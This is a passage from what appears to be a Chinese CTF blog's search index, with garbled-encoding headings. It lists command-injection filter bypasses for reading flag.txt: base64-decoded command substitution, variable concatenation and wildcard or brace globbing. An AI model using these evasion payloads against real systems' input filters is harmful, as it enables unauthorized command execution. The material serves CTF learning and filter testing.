shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`echo &#x27;Y2F0Cg==&#x27; | base64 -d`  flag.txt #cat </span><br></pre></td></tr></table></figure><h4 id="æ‹¼æ¥ç»•è¿‡">æ‹¼æ¥ç»•è¿‡</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=at;c=f;d=lag;e=.txt;$a$b $c$d$e</span><br></pre></td></tr></table></figure><h4 id="é€šé…ç¬¦ç»•è¿‡">é€šé…ç¬¦ç»•è¿‡</h4><blockquote><p>[â€¦]è¡¨ç¤ºåŒ¹é…æ–¹æ‹¬å·ä¹‹ä¸­çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦</p><p>{â€¦}è¡¨ç¤ºåŒ¹é…å¤§æ‹¬å·é‡Œé¢çš„æ‰€æœ‰æ¨¡å¼</p><p>ä¸Šè¿°äºŒåˆ™çš„åŒºåˆ«ï¼Œå½“åŒ¹é…çš„æ–‡ä»¶ä¸å­˜åœ¨æ—¶ï¼Œ[â€¦]ä¼šå¤±å»æ¨¡å¼çš„åŠŸèƒ½ï¼Œå˜æˆä¸€ä¸ªå•çº¯çš„å­—ç¬¦ä¸²ï¼Œè€Œ{â€¦}ä¾ç„¶å¯ä»¥å±•å¼€ã€‚</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat f?ag.txt</span><br><span class="line">cat fl*</span><br><span class="line">cat f[a-z]ag.txt</span><br><span class="line">cat fl&#123;a,b,c,d,e&#125;g.txt</span><br></pre></td></tr></table></figure><p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/rce1_1_3.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLæ³¨å…¥ </tag>
            
            <tag> äºŒåˆ†æ³• </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
